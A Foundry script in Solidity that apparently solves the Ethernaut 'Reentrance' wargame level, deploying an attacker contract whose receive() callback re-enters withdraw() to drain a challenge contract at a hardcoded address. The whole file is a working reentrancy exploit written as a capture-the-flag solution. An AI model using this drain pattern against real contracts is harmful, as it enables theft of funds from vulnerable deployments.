//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Reentrance} from "src/ethernaut10.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut10Script is Script{
    Reentrance instance = Reentrance(0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attacker a = (new attacker){value: 0.001 ether}();
        a.attack();

        console.log("Attacker Balance: ", address(a).balance);
        console.log("Instance Balance: ", address(instance).balance);
    
        vm.stopBroadcast();
    }
}
contract attacker{
    Reentrance instance = Reentrance(0xcE65Bda0AF6b6F58F0dF86ba57CF16156212D514);

    constructor() public payable{
    }

    function attack() external payable {
        instance.donate{value: 0.001 ether}(address(this));

        instance.withdraw(0.001 ether);
    }

    receive() external payable{
        if(instance.balanceOf(address(this)) >= 0.001 ether && address(instance).balance >= 0.001 ether){
            instance.withdraw(instance.balanceOf(address(this)));
        }
    }
}

